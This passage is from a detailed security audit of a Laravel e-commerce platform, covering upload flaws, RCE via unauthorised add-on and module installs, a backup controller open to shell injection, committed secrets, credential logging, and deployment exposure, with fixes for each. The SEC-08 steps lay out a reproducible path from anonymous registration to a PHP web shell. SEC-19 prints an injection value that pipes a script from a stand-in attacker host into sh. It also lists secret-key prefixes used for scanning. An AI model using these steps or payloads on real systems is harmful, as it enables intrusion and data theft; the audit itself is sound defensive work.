committed artefact `uploads/receipt/icon.png_1783941141` confirms this path runs in production.)

**Related upload weaknesses in the *normal* path.**
- **The allowlist lives in the database and is admin-editable** —
  `repo-A app/Models/Utility.php:344-359` reads `local_storage_validation` and
  `local_storage_max_upload_size` from settings. Seeded default:
  `jpg,jpeg,png,csv,svg,pdf`; a secondary fallback at `repo-A app/Helper/helper.php:821` is broader still
  (`jpeg,jpg,png,svg,zip,txt,gif,docx`). A security control sitting in mutable application data rather
  than in code.
- **SVG is in the default allowlist and is an active-content format.** User-uploaded SVGs already exist in
  the tree (e.g. `repo-A uploads/19/100_1787053229_Home-Smile-2-Line--Streamline-Remix.svg`), and
  `repo-A .htaccess:23` routes `.svg` **around** Laravel, so it is served straight off disk as
  `image/svg+xml` with no `Content-Disposition`. With no CSP and no `nosniff` (SEC-28), an uploaded SVG is
  same-origin script. *(Note the 49,636 tracked `.svg` files are overwhelmingly framework and theme icon
  assets, not an attack surface in themselves — the signal is the user-uploaded ones.)*
- **World-writable directories.** `repo-A app/Helper/helper.php:2078-2086`, called at
  `repo-A app/Models/Utility.php:381` before every local write, does `umask(0)` then `makeDirectory(…,
  0777, true)` then `@chmod($fullPath, 0777)` on every path segment inside the webroot. On shared hosting
  this grants other tenants write access to the upload tree. **MEDIUM**, and it compounds this finding.

**A deliberate negative finding, because it is the intuitive claim and it is wrong.** The dominant pattern
(113 `getClientOriginalName()` uses) is
`rand(10,100).'_'.time()."_".$file->getClientOriginalName()`. **Path traversal does not hold here**:
Symfony's `UploadedFile::getClientOriginalName()` returns a basename — its constructor strips directory
components — so `../../evil` cannot escape `$dir`. The real defect is that the **extension** is fully
attacker-controlled.

**On whether a plain `.php` upload passes the *normal* path — BLOCKED.** Laravel's `mimes` rule validates
the content-sniffed extension, so a PNG polyglot containing `<?php … ?>` satisfies `mimes:png`. Laravel's
`validateMimes` is also understood to call a `shouldBlockPhpUpload()` guard rejecting
`php, php3, php4, php5, php7, php8, phtml, phar` client extensions — **this could not be verified from
source because `vendor/` is absent.** If that guard runs, the normal path resists direct `.php` upload and
the residual risks are extensions some Apache configs map to PHP (`.pht`, `.phtm`, `.phps`, `.inc`) and
double extensions (`getClientOriginalExtension()` returns only the final component, so `evil.php.jpg` is
seen as `jpg`, and a legacy `AddHandler … .php` directive executes it). Both **SUSPECTED**,
server-config dependent. **None of this applies to this finding**, where the validator never runs at all.

**Remediation (one chokepoint, high leverage).** All uploads already funnel through this one helper —
**zero** direct `->store(`/`->storeAs(`/`->move(`/`Storage::put` calls exist across `app/ packages/
themes/`, which is unusually good news for remediation. So: (a) validate unconditionally — remove the
`empty($image)` guards at `repo-A app/Models/Utility.php:362,369`; (b) add a **hardcoded code-level**
extension allowlist that the DB setting can only narrow, never widen; (c) **generate filenames
server-side** (`Str::uuid() . '.' . $safeExt`) and stop appending `getClientOriginalName()` — this kills
the attacker-controlled extension across all 113 sites at once; (d) change the `theme` disk root
(`repo-A config/filesystems.php:49`) from `base_path('')` to a non-executable directory outside the
webroot, served through a controller; (e) replace `0777`/`umask(0)` with `0755`; (f) add `permission:`
middleware to `repo-A routes/web.php:735`. Apply the same change to the four sibling helpers
(`repo-A app/Models/Utility.php:890`, `:3436`, `:2129`, and
`repo-A packages/workdo/LandingPage/src/Entities/LandingPageSetting.php:124`).
**Sequencing matters:** existing DB rows store paths built the old way, so (d) requires migrating stored
paths or a compatibility shim on read — ship (a)+(b)+(c) first.

---

#### SEC-08 — Two remote-code-execution paths reachable by anonymous self-registration
**CRITICAL · P0 · Status VERIFIED (code path and reachability)**

**Where.** `repo-A routes/web.php:787` (`POST theme-addon` → `AddonController::ThemeInstall`) and
`repo-A routes/web.php:913` (`POST install-modules` → `ModuleController::install`). Both sit in exactly
one route group — `repo-A routes/web.php:326` `['auth','xss','setlocate','verified']` — with no nested
group, no `permission:` middleware, no controller constructor middleware, no FormRequest, and no global
authorization middleware in `repo-A bootstrap/app.php`.

**Neither method body contains any authorization check — and that is demonstrably an oversight**, because
sibling methods in the *same two controllers* do check:
`repo-A app/Http/Controllers/AddonController.php:21` and `:153` require `type == 'super admin'`;
`repo-A app/Http/Controllers/ModuleController.php:24`, `:127`, `:300` require `isAbleTo(...)`.

**Path 1 — fully constructed, anonymous to RCE.**
1. `POST /register` (`repo-A routes/auth.php:17`) →
   `repo-A app/Http/Controllers/Auth/RegisteredUserController.php:184` creates a `users` row with
   `type = 'admin'` and `:206` calls `Auth::login($user)`. The `verified` middleware is a no-op unless the
   super admin's `email_verification` setting is `"on"`
   (`repo-A app/Http/Middleware/EmailIsVerified.php:35-44`) — and if it is, the attacker verifies their
   own registration e-mail once, which is a speed bump, not a control.
2. Build `payload.zip` containing one entry `payload/sh.php`.
3. `POST /theme-addon` as multipart with field `file` and the session's CSRF token (trivially read from
   any rendered page — CSRF stops third-party forgery, not a first-party attacker). `ThemeInstall`
   (`repo-A app/Http/Controllers/AddonController.php:54`) performs no authorization and **no validation of
   mime or extension anywhere in `:54-78`**.
4. `repo-A app/Http/Controllers/AddonController.php:65` `$zip->extractTo('themes/')` writes
   `<project root>/themes/payload/sh.php` — a **relative** path resolving to the project root, which
   `repo-A index.php` and `repo-A .htaccess` establish as the document root. `:72-74` then chmods the
   extraction path `0777`.
5. `GET /themes/payload/sh.php`. Per `repo-A .htaccess:24-26` the front-controller rewrite is skipped
   because `REQUEST_FILENAME` now **is** an existing file, so Apache hands it to the PHP handler.

**Obtained:** arbitrary OS command execution as the web user — which also yields the committed `.env`
secrets and the whole multi-tenant database.

**Path 2 — same actor, a second and independent mechanism that does not even need the webroot.**
`POST /install-modules` with `Evil.zip` containing `Evil/composer.json` (declaring
`extra.laravel.providers` and a PSR-4 map), `Evil/module.json`, and the provider class.
`repo-A app/Http/Controllers/ModuleController.php:251` writes them to `packages/workdo/Evil/`, and
`:279-287` inserts an `add_on_managers` row whose `module` name comes from **the attacker's own
`module.json`**. On the attacker's next request,
`repo-A app/Providers/PackageServiceProvider.php:32` plucks every `add_on_managers` row **with no
`is_enable` filter**, and `:79` calls `$this->app->register($provider)` for each provider named in the
attacker's `composer.json` — so attacker PHP runs **in-process inside the Laravel application**, with full
database and config access, even though `install` sets `is_enable = 0`. Independently,
`repo-A .htaccess:30-31` adds an explicit passthrough for `/packages/workdo/*`, making
`GET /packages/workdo/Evil/sh.php` directly executable.

**Two errors from the first pass, corrected here so they are not repeated in remediation.** (1) The claim
that `PackageServiceProvider` "autoloads `packages/workdo/*`" is **false as written** — it loads only
DB-registered names, which is precisely why the attacker-controlled `add_on_managers` insert is the
mechanism. (2) The "raw archive paths / path-traversal" framing is **not demonstrated**: Symfony basenames
the client filename and PHP 8.3's `ZipArchive::extractTo` normalises `../` entries. Traversal is
**unnecessary**, because the destinations are already inside the document root.

**Path 3 — real but mis-scoped, and the scoping correction matters.** `POST /backuprestore` carries
`PlanModuleCheck:BackupRestore`
(`repo-A packages/workdo/BackupRestore/src/routes/web.php:17`), which for non-super-admins requires the
module to be **enabled and present in the tenant's plan entitlement**
(`repo-A app/Http/Middleware/PlanModuleCheck.php:34,41-52`) — so it is **not** reachable by "any
authenticated user". Given that entitlement, however, see SEC-19.

**Residual unknowns, declared.** Whether the super admin's `email_verification` setting is `"on"`;
whether `add_on_managers` currently contains BackupRestore (no DB access). And note: if the production
document root were `public/` rather than the project root, `ModuleController`'s relative writes would land
in `public/packages/workdo/`, which is **even more directly web-executable** — so neither deployment
layout refutes this finding.

**Remediation.** Add `type == 'super admin'` checks to `AddonController::ThemeInstall` and
`ModuleController::install`, copying the sibling pattern at `AddonController.php:21`; add `permission:`
middleware to `repo-A routes/web.php:787,913`; validate the uploaded archive's mime and inspect entry
names and extensions before extraction; extract to a staging directory **outside** the webroot and move
only vetted files; and add an `is_enable = 1` filter to
`repo-A app/Providers/PackageServiceProvider.php:32` so a disabled module's provider is never registered.

---

#### SEC-19 — Backup module: no permission check, shell injection, archives `.env`, chmod 0777, and no restore
**CRITICAL · P0 · Status VERIFIED · Implementation: backup PARTIALLY IMPLEMENTED; restore MISSING**

This is the platform's **only** backup facility (44 files; `spatie/laravel-backup` is not a dependency).
`repo-A packages/workdo/BackupRestore/src/app/Http/Controllers/BackupRestoreController.php` was read in
full. Seven distinct defects:

**(a) Not scheduled — manual HTTP trigger only.** The only entry point is a resource route
(`repo-A packages/workdo/BackupRestore/src/routes/web.php:17-19`). An exhaustive schedule search across
`app bootstrap routes packages/workdo` returns only `repo-A routes/console.php:8-9`. **Backups happen only
when a human remembers to click. There is no RPO.**

**(b) `store()` has NO permission check, unlike every sibling.** `index()` checks
`isAbleTo('backup&restore manage')` (`:26`), `create()` checks `'backup&restore create'` (`:42`),
`destroy()` checks `'backup&restore delete'` (`:256`). But `store()` — the method that performs the backup
and reaches the shell — begins at `:54` and goes straight to validation at `:56` with **no `isAbleTo` gate
at all**.

**(c) Shell command injection via unvalidated `database_name`.** `:144` validates it as `'required'` only,
then:
```php
181: $filename = $database_name . '_' . date('YmdHis') . '.sql';
182: $backupFilePath = $backupPath . '/' . $filename;
188: $command = "mysqldump -u {$username} -p{$password} {$databaseName} > {$backupFilePath}";
190: shell_exec($command);
```
`$backupFilePath` embeds the attacker-controlled `$database_name` **unescaped** (no `escapeshellarg`) into
`shell_exec`. Combined with (b), `database_name=x;curl http://attacker/s|sh;#` is command execution for
any entitled merchant **or any of their staff holding zero backup permissions**. The `xss` middleware does
not strip shell metacharacters (`; | \` $( >`). Note also the **DB password is interpolated onto the
command line**, where it is visible in the process table to every local user. *(If the deployed `php.ini`
sets `disable_functions=shell_exec` this specific path fails closed — **UNKNOWN**, not verifiable from the
repo. SEC-08's paths 1 and 2 depend on no PHP configuration and remain exploitable regardless.)*

**(d) The file backup archives the entire application root, `.env` included.** `:93-113` sets
`$pathsToBackup = [base_path()]` and the **sole exclusion is `.zip` files**. So the archive contains `.env`
(with `APP_KEY`, `DB_PASSWORD`, `MAIL_PASSWORD`, `REVERB_APP_SECRET` — SEC-16), `vendor/`, and the 407
customer-upload files under `uploads/`.

**(e) Backups are written inside the application tree, not off-site.** `base_path('storage/uploads')` at
`:78` and `:172` — same disk, same server, same filesystem as the thing being backed up. A disk failure or
a server compromise takes the backups with it. There is no `Storage::disk` and no remote target anywhere
in the file.

**(f) No encryption, and chmod 0777 on the output.** `:193-194` `File::chmod($backupPath, 0777)` and
`File::chmod($backupFilePath, 0777)`. A **world-readable, world-writable, unencrypted archive containing
production credentials and customer data.** No password is passed to `ZipArchive`; no `openssl`/`sodium`
call appears in the file.

**(g) There is no restore.** Despite the module name, `show()` (`:222-225`), `edit()` (`:232-235`) and
`update()` (`:243-246`) are empty stubs. **Recovery capability: MISSING. A backup you cannot restore is
not a backup.**

**Bonus defect.** `destroy()` builds a **relative** path (`:260,262`) while creation used absolute
`base_path(...)`. Under the root-docroot layout the relative path resolves against the PHP working
directory, so `File::exists()` fails, `File::delete()` is skipped, yet `$backup_file->delete()` (`:268`)
removes the DB row and the controller reports success. **Archives accumulate on disk forever, orphaned and
world-readable.**

**Remediation.** Adopt `spatie/laravel-backup`: scheduled daily, `->encryptUsing()` with a key held
outside the repo, destination an **off-box** S3-compatible bucket, explicit exclusion of `.env` and
`vendor/`, a retention policy, and failure notifications. Then **remove** the `BackupRestore` module, or at
minimum (i) add the missing `isAbleTo` gate to `store()`, (ii) replace the `shell_exec` string with
`Process::run(['mysqldump', …])` using array arguments and `MYSQL_PWD` via environment rather than the
command line, (iii) drop the `0777` chmods. Separately, **write and rehearse a restore runbook** — there
is none. *Prerequisites and risk:* `spatie/laravel-backup` needs `mysqldump` on PATH and an outbound route
to object storage, both commonly restricted on cPanel shared hosting (see Section 4.5); encryption keys
need their own custody plan, because a lost key makes the backups worthless. `BackupRestoreLog`, its
migration and the `BackupRestoreData` DataTable can be kept as the audit-log/UI layer over a spatie
backend.

---

### 1.8 Sensitive data exposure and secret management

#### SEC-16 — `.env` with live secrets committed to git; third-party OAuth secrets hardcoded in config
**CRITICAL · P0 · Status VERIFIED**

**No secret value appears below — variable names and `file:line` only.**

**(a) `.env` is currently tracked** (`git ls-files` → `.env`, `.env.example`) and was added in commit
`3c39c160`. The root cause is visible in `repo-A .gitignore`, all five lines of it, which contain **no
`.env` entry at all**:
```
1: /public/uploads/
2: /storage/app/public/
3: /vendor/
4: /storage/logs/*.log
5: /storage/
```
Line 3 covers `/vendor/`, so the author understood the mechanism and simply never added `.env`. Line 1
ignores `/public/uploads/` but **not** the `/uploads/` tree the `theme` disk actually writes to, which is
why 407 tenant media files are in version control.

Populated secret-bearing variables in the committed file: `APP_KEY` (`repo-A .env:3`), `DB_PASSWORD`
(`:13`), `REDIS_PASSWORD` (`:22`), `MAIL_PASSWORD` (`:29`), `PUSHER_APP_SECRET` (`:34`),
`REVERB_APP_KEY` (`:37`), `REVERB_APP_SECRET` (`:38`), `VITE_REVERB_APP_KEY` (`:43`),
`FIREBASE_CREDENTIALS` (`:52`). Also populated and sensitive-adjacent: `DB_HOST` (`:9`), `DB_DATABASE`
(`:11`), `DB_USERNAME` (`:12`), `MAIL_HOST` (`:26`), `MAIL_USERNAME` (`:28`).

**(b) Hardcoded, populated, live third-party secrets in a tracked config file** — not `env()`-driven,
literal values:

| file:line | key | assessment |
|---|---|---|
| `repo-A config/services.php:30` | `zid.client_id` | real (numeric app id) |
| `repo-A config/services.php:31` | `zid.client_secret` | **real OAuth client secret** |
| `repo-A config/services.php:33` | `zid.hook_user` | real |
| `repo-A config/services.php:34` | `zid.hook_pass` | **real webhook shared secret** |
| `repo-A config/services.php:44` | `deliverysyria.api_key` | populated; the value's shape suggests a placeholder — **owner must confirm**; rotate regardless |
| `repo-A config/myfatoorah.php:10` | `api_key` | JWT-shaped with `test_mode => true` (`:15`), so most likely the vendor's **test** token — confirm before go-live |

`repo-A config/services.php:32` also hardcodes the production `redirect_uri`, corroborating that these are
production rather than sample values. These were introduced by **this team**, not inherited:
`git log -S"hook_pass" --all -- config/services.php` returns only `f33e8525`, and
`git show 3c39c160:config/services.php | grep -E "zid|hook_pass"` returns nothing. Because they are
literals rather than environment variables, rotation requires a **code change plus a history rewrite**,
not just a credential swap.

**Deliberately excluded as non-findings** (value lengths were checked precisely to avoid inflating this):
`repo-A config/services.php:62-97` — 14 Socialite `client_id`/`client_secret` entries, **all length 0**,
i.e. empty framework scaffolding. And `repo-A config/installer.php:74-94` — these are **Laravel validation
rule strings** (`'database_password' => 'nullable|string|max:50'`), **not** credentials, despite matching a
naive secret grep.

**(c) Production debug mode, independently serious.** `repo-A .env:2` `APP_ENV=local`, `:4`
`APP_DEBUG=true`, `:6` `APP_URL=https://storesyria.com`. Identical in the working copy and in
`3c39c160`, and `git status --porcelain .env` is clean — so **the committed file is the deployed
configuration**. `repo-A config/app.php:42` is `'debug' => (bool) env('APP_DEBUG', false)`. With debug on,
any unhandled exception renders Laravel's stack-trace page, printing file paths, code excerpts and
commonly environment variables and queries. This **largely moots** the SEC-32 exposure question: a single
500 leaks much of the same material. It is also why the `firstOrFail()` throws reachable without
authentication (SEC-26) are worse than they look.

**(d) A clean result worth recording.** A key-prefix sweep (`sk_live_`, `pk_live_`, `rzp_live_`, `AIza…`,
`AKIA…`, `ghp_`, `xox[baprs]-`, `SG.`, `eyJ…`) over `app config packages resources themes public database
routes` in Repo A and `lib android ios` in Repo B returned **no matches in either repo**. A genuine clean
result.

**Impact.** `APP_KEY` disclosure is the compounding one: it breaks `Crypt::decryptString`, which is
precisely what guards the stored Zid OAuth credentials in SEC-13/SEC-14, and it enables Laravel
cookie and session forgery. The repository has been cloned, so every value above must be treated as public.

**Remediation — order matters, and this is the single highest-priority item in the document.**
1. **Rotate first.** Rotate `APP_KEY`, `DB_PASSWORD`, `REDIS_PASSWORD`, `MAIL_PASSWORD`, all `PUSHER_*`,
   all `REVERB_*`, `FIREBASE_CREDENTIALS`, the two Zid secrets and the DeliverySyria key. Purging does not
   un-leak an already-cloned repository, so rotation is the non-negotiable half.
2. **Then purge history.** `git filter-repo --invert-paths --path .env --path error_log --path
   composer.phar --path "_active', 1)" --path uploads/`, force-push, and have every clone re-cloned. The
   repo is only 6 commits, so the rewrite itself is cheap.
3. Replace the `repo-A config/services.php` literals with `env()` calls — **and fix the latent fail-open
   at `repo-A routes/web.php:988-989` in the same change**, or that move activates it (SEC-14).
4. `git rm --cached .env`; extend `.gitignore` from its current 5 lines to the stock Laravel 11 file plus
   `/uploads/`, `bootstrap/cache/*.php`, `error_log`, `composer.phar`, `_active*`.
5. Set `APP_DEBUG=false`, `APP_ENV=production`.

**Plan for this explicitly:** rotating `APP_KEY` invalidates every session and **breaks decryption of any
`Crypt`-encrypted column**, including the Zid credential rows at `repo-A app/Services/Zid.php:15-16`.
Those rows must be re-encrypted or the merchants re-authorised. Do not discover that in production.

---

#### SEC-25 — Plaintext passwords and bearer tokens written to a log file inside the webroot
**HIGH · P0 · Status VERIFIED (logging) / SUSPECTED (web reachability of the log) · Implementation: IMPLEMENTED AND VERIFIED (as written)**

**Where.** `repo-A app/Http/Middleware/APILog.php:24-35` and the **byte-identical**
`repo-A app/Http/Middleware/AdminApiLog.php:24-35`:
```php
29: Log::channel('API_log')->info('request');
30: Log::channel('API_log')->info($request);
32: Log::channel('API_log')->info('response');
33: Log::channel('API_log')->info($response);
```
`$request` is an `Illuminate\Http\Request`; logging it stringifies the **whole** request — request line,
headers (including `Authorization: Bearer …`) and body. `$response` likewise includes the response body.
Both middlewares' `handle()` is a bare `return $next($request);` (`:19-22`), so all work is in
`terminate()` — this is working as written, not broken.

**These middlewares are attached to the credential-bearing routes:** `repo-A routes/api.php:46`
(`{slug}/register`), `:47-48` (`adminlogin`), `:50-52` (the three forgot-password endpoints), `:95`
(`change-password`), `:134` (`admin/adminlogin`), `:286` (`admin/updatepassword`), `:315-316`
(`admin/delivery-login`). So **every plaintext password, every OTP and every issued Sanctum token** is
persisted to disk in cleartext.

**Destination.** `repo-A config/logging.php:134-139` — a `daily` channel at
`storage_path('logs/api.log')` with `'level' => 'debug'` and `'days' => 15`. `storage_path()` resolves
under `base_path()`, i.e. inside the webroot per SEC-32 — and `.htaccess` has **no deny rule for
`storage/`**, only the `!-f`-guarded rewrite at `repo-A .htaccess:36` which, because the log file *does*
exist, does not fire.

**Could not verify.** `repo-A storage/logs/` does not exist in this checkout (gitignored), so the
**logging is proven from code** but the **contents are inferred**. Check `storage/logs/api.log*` on the
server for `password` and `Authorization`, and handle whatever is there as a live secret.

**Remediation.** Collapse the two byte-identical files into one and replace `$request`/`$response` with an
explicit allowlist of fields (method, path, status, duration, user id), redacting `password`,
`password_confirmation`, `old_password`, `new_password`, `otp` and `token`. Remove the `$response` logging
entirely, since it contains issued tokens. Then **purge existing logs and treat them as a credential
dump — revoke every token found there.** Reconsider `days => 15`, which is long for request logs.

---

#### SEC-31 — Session cookies issued without `Secure` and without `SameSite` on an HTTPS site
**HIGH · P1 · Status VERIFIED**

| Setting | `repo-A config/session.php` | Effective value |
|---|---|---|
| `driver` | `:21` `env('SESSION_DRIVER','database')` | `.env:18` sets `file` |
| `lifetime` | `:35` | 120 min; `expire_on_close` false (`:37`) |
| `encrypt` | `:50` `env('SESSION_ENCRYPT', false)` | **false** |
| `secure` | `:172` `env('SESSION_SECURE_COOKIE')` | **null** — no `Secure` flag; the variable is absent from `.env` |
| `http_only` | `:185` `env('SESSION_HTTP_ONLY', true)` | true (good) |
| `same_site` | `:202` `env('SESSION_SAME_SITE', null)` | **null** — no `SameSite`. **Laravel 11 ships this default as `'lax'`; it has been changed to `null` here** |
| `partitioned` | `:215` | false |

`repo-A .env:6` is `APP_URL=https://storesyria.com` but there is no `SESSION_SECURE_COOKIE`. So the session
cookie for an HTTPS production site is issued **without `Secure`** — it will travel over plain HTTP if any
link or redirect downgrades — and **without `SameSite`**, so it is attached to cross-site requests,
broadening CSRF exposure, which matters especially for the 30 CSRF-exempt paths at
`repo-A bootstrap/app.php:33-64`.

**Two further session defects, customer-side only.** `repo-A app/Http/Controllers/Customer/Auth/CustomerLoginController.php:589-590`
logs a customer in with **no `$request->session()->regenerate()`** — session fixation — and `logout` at
`:631-640` calls `Auth::guard('customers')->logout()` with **no `session()->invalidate()` and no
`regenerateToken()`**. **Contrast:** the merchant path does both correctly
(`repo-A app/Http/Controllers/Auth/AuthenticatedSessionController.php:77` on login, `:139-141` on logout).
The customer guard was simply not held to the same standard. MEDIUM.

**Remediation.** Set `SESSION_SECURE_COOKIE=true`, `SESSION_SAME_SITE=lax`, `SESSION_ENCRYPT=true`, and
restore the stock Laravel 11 default at `repo-A config/session.php:202` so a missing variable fails safe.
Add `session()->regenerate()` to customer login and `invalidate()`+`regenerateToken()` to customer logout.
**Risks:** `SameSite=lax` can break third-party payment callbacks that POST back into a session — test the
gateway flows, especially the CSRF-exempt list. `SESSION_ENCRYPT=true` logs everyone out once.
**Prerequisite: rotate the committed credentials first** (SEC-16).

---

#### SEC-32 — The deployment serves the application root rather than `public/`
**HIGH · P1 · Status PARTIAL · Implementation: N/A (deployment defect)**
*(Severity corrected downward from CRITICAL by the adversarial pass, twice, and two limbs of the original
claim were refuted. The corrected version is used; the refuted limbs are in Section 3.)*

**The layout is established.** `repo-A index.php:17-21` is Laravel's `server.php` helper renamed to
`index.php` — the standard shared-hosting trick for pointing a vhost at the app root:
```php
17: if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
18:     return false;
19: }
21: require_once __DIR__.'/public/index.php';
```
Laravel 11 ships neither a root `index.php` nor a root `.htaccess`, so both are deliberate additions
(`git log --oneline --all -- index.php .htaccess` → only `3c39c160`). The root `.htaccess` rewrites static
prefixes **into** `public/` (`repo-A .htaccess:33-36`) — rules that are meaningless unless requests land at
the app root. And `repo-A error_log:1`, which is committed, was written server-side and records the
absolute path `/home/<redacted-account>/public_html/app/Http/Controllers/Api/ApiController.php` — i.e. the
application's `app/` directory sits **directly inside the cPanel document root**. There is no vhost,
nginx conf, `web.config`, Dockerfile or any other deploy/server config anywhere in the repo, so the
root-level shared-hosting scaffolding is **not dead code**.

**The mechanism that makes it matter.** `repo-A .htaccess:24-26`:
```apache
24: RewriteCond %{REQUEST_FILENAME} !-d
25: RewriteCond %{REQUEST_FILENAME} !-f
26: RewriteRule ^ index.php [L]
```
`!-f` means **any path resolving to a real file under the app root is served by the web server and never
reaches Laravel** — making every route-group middleware, CSRF, laratrust and the custom XSS middleware
irrelevant *by construction* for those paths. The only access-control directive in the entire repo is a
single-filename deny for `.env` (`repo-A .htaccess:6-9`); an exhaustive search found exactly two
`.htaccess` files, and `repo-A public/.htaccess:1-21` (the stock Laravel file) contains **no deny rule at
all**, and there is no `.user.ini`, `php.ini`, `web.config` or `nginx.conf`.

**What is precisely exposed.** The non-PHP files at the app root: `/composer.lock` (616,086 bytes — the
exact pinned version of every dependency, i.e. a ready-made CVE target list), `/composer.json`,
`/package.json`, `/package-lock.json`, `/.env.example`, `/error_log` (leaking the absolute server path and
internal controller names), `/composer.phar` (3.6 MB), the 52,832-byte junk file `_active', 1)`, and
`/uploads/**` (407 tracked files including `uploads/receipt/` and `uploads/profile/` — customer-uploaded
documents served with no auth and no signed URL, because `.htaccess:33-36` only redirects to `public/`
when the path is **absent** at the root). On the host, `/storage/logs/*.log` is in the same exposed class
(SEC-25). A narrower vector that the first pass missed: the **1,232 tracked `*.blade.php` templates** are
run through the PHP handler, which echoes everything outside `<?php ?>` verbatim, so **Blade markup leaks
as text** — partial template disclosure.

**Mitigations that do exist, credited.** `repo-A .htaccess:3` `Options -MultiViews -Indexes` blocks
directory listings, so an attacker must know or guess filenames — and upload names embed a unix timestamp,
making the `uploads/` vector enumeration-bound rather than trivially walkable. And the `<Files .env>` deny
is nested inside `<IfModule mod_rewrite.c>` (opened `:1`, closed `:37`), which sounds fragile but is
practically inert: **if mod_rewrite were absent the whole block is skipped, taking the front-controller
rewrite at `:26` with it, so every URL except `/` would 404 and the site would be visibly broken.** In any
functioning deployment mod_rewrite is loaded and `.env` **is** denied. That is a brittle pattern, not an
exploitable condition.

**Net severity: HIGH / P1 — unauthenticated dependency-inventory, internal-path and customer-document
disclosure.** No path to code execution, authentication bypass, privilege escalation or credential theft
was demonstrated *via this finding* (SEC-08 and SEC-15 reach code execution by other means, and they are
amplified by this layout).

**BLOCKED.** Live confirmation was not possible: HTTP probes to storesyria.com failed at the sandbox
egress proxy (curl exit 56; CONNECT tunnel 403) for all probed paths, and were not bypassed. **The single
highest-value next check** is one `curl -I` per path against the live host or staging — it converts this
finding from PARTIAL to CONFIRMED-or-dismissed in minutes.

**The one UNKNOWN that could change the severity back to CRITICAL.** Whether `/.git/` is present on the
server. The repository's `.git` holds commit `3c39c160` with the committed `.env`, and **nothing in either
`.htaccess` denies dotted directories**. The git shape is suggestive — `3c39c160` was a full snapshot that
included 24,092 `vendor/` paths, later stripped in `de014225` (24,093 files changed, 3,223,362 deletions),
and the ignore rules were added progressively across `4a5f686a`/`de014225`/`5882399e`, which is the
signature of `git init` inside a deployed directory, with `f33e8525` titled "…adjustments on server". But
there is **no evidence either way** and the probe was blocked. **If `GET /.git/config` returns 200, the
severity of the deployment layout becomes CRITICAL.** This is the one check the owner should run by hand
from outside, today.

**Remediation.** Point `DocumentRoot` at `…/public_html/public` and delete the root `index.php` and
`.htaccess`. **Do this on staging first** — it is the one recommendation in this document that can visibly
break the site, because the `.htaccess:33-36` rewrites exist precisely because assets are referenced
without the `public/` prefix; expect broken image URLs and audit `get_file()`
(`repo-A app/Helper/helper.php:141`) and `url($path)` (`repo-A app/Models/Utility.php:403`). If the
docroot genuinely cannot move (some shared hosts), the strictly second-best fallback is explicit denies
for dotfiles, `.git`, `*.lock`, `*.json`, `*.log`, `error_log` and `*.phar`, placed **outside** any
`<IfModule>` wrapper, plus relocating `uploads/` under `public/` behind signed URLs.

---

#### SEC-33 — Abandoned installer package with the HTTP `/update` migration route enabled
**HIGH · P1 · Status PARTIAL · Implementation: PARTIALLY IMPLEMENTED**

`repo-A composer.json:58` requires `rachidlaasri/laravel-installer: ^4.1`, and `composer.lock` flags it
**`abandoned: true`**, version `4.1.0`, released `2020-05-19`. **The install and upgrade path of a
payment-handling platform is an abandoned package six years stale and receiving no security fixes.** It is
registered (`repo-A bootstrap/cache/packages.php:279`), its views are published and present
(`repo-A resources/views/vendor/installer/` — including `environment-wizard` and `environment-classic`,
which are **`.env` editors**), and `repo-A app/Http/Middleware/XSS.php:47` actively redirects super-admins
to `redirect()->route('LaravelUpdater::welcome')`, proving the routes are registered at runtime.

Two config values raise this above routine dependency rot:
```php
132: 'installedAlreadyAction' => '',
143: 'updaterEnabled' => 'true',
```
(`repo-A config/installer.php:132,143`.) `updaterEnabled` true means the `/update` route **may run
database migrations over HTTP**. `installedAlreadyAction` is **empty**, so the already-installed behaviour
is the package default; per the comments at `:124-131` the empty value falls back to
`/resources/views/error/404.blade.php`, **which does not exist** (`ls` → No such file), so the lockout
branch would throw rather than cleanly 404. Also `repo-A config/installer.php:18-21` `'final' => ['key' =>
true]` means completing the wizard **regenerates `APP_KEY`**, invalidating every encrypted column and
session — i.e. re-running it against a live install is destructive. And `repo-A config/installer.php:46-53`
instructs the operator to chmod **0777** on `storage/`, `bootstrap/cache/`, `resources/lang` and
`uploads/`; world-writable `bootstrap/cache/` is the sharpest edge, because anything that can write a file
there can plant PHP that Laravel loads and executes on the next request. Finally
`repo-A config/installer.php:16` `'minPhpVersion' => '8.1.0'` contradicts `composer.json`'s `"php":
"^8.2"`, so the wizard would green-light a PHP version on which the dependency tree will not install.

**Why this is PARTIAL rather than VERIFIED.** Whether `/install` and `/update` are actually reachable
depends on the package's `canInstall` gate, whose source lives in the **absent `vendor/`**, and on a
marker file under `storage/` which is gitignored and absent here. Nothing in the app references such a
marker (`grep "storage/installed\|'installed'" app routes` → no output). So **a fresh deployment from this
repo has no marker and the wizard is open** until someone completes it; whether the live host has one is
**UNKNOWN**. If it does not, an unauthenticated attacker rewrites `DB_*` to their own server and `APP_KEY`
to a known value — total compromise with no credentials. Settling it is cheap:
`curl -I https://<host>/install` and `/update`.

**Remediation.** If the application is installed: remove `rachidlaasri/laravel-installer`, delete
`repo-A resources/views/vendor/installer/`, and rework the `repo-A app/Http/Middleware/XSS.php:47`
redirect (which must be preserved when the XSS middleware is deleted per SEC-35). If it must stay: set
`installedAlreadyAction` to `'abort'`, `updaterEnabled` to false, create the missing
`resources/views/error/404.blade.php`, and verify the marker exists on the live host. Note that disabling
the updater may break the Workdo vendor's documented upgrade path, which is a commercial question for the
owner.

### 1.9 Rate limiting

#### SEC-24 — There is no rate limiting on the API
**HIGH · P0 · Status VERIFIED · Implementation: MISSING**

**Measured, and re-verified while writing this document:**
`grep -rn "throttleApi\|throttle:api" bootstrap/ routes/ app/` in Repo A returns **0 hits**.
`repo-A bootstrap/app.php:15-65` configures middleware aliases, one group append and the CSRF exclusions —
it **never calls `$middleware->throttleApi()`**. `repo-A app/Providers/RouteServiceProvider.php:27-29`
*defines* an `api` limiter but nothing uses it. Of **211 route registrations in `repo-A routes/api.php`**
— published with its command, `grep -cE "Route::(get|post|put|patch|delete|any|match|resource|apiResource)"
routes/api.php` = **211**, while 213 lines contain the string `Route::` (the other two are not
registrations); **211 is the route count used throughout this report** —
exactly two carry an explicit `throttle:` — `:48` (`adminlogin`) and `:316` (`delivery-login`), both
`throttle:auth`. The enclosing group at `repo-A routes/api.php:133` adds prefix and name only.

**Why this is P0 rather than a hygiene item.** Unthrottled enumeration is what converts several findings
above from theoretical to practical:
- SEC-01's token forgery needs to walk `personal_access_tokens.id` until a privileged row is hit — and
  note that `repo-A app/Http/Controllers/Api/DashboardController.php:584` deletes a user's prior tokens on
  each login, keeping the live id space **small and dense**, so the walk is short.
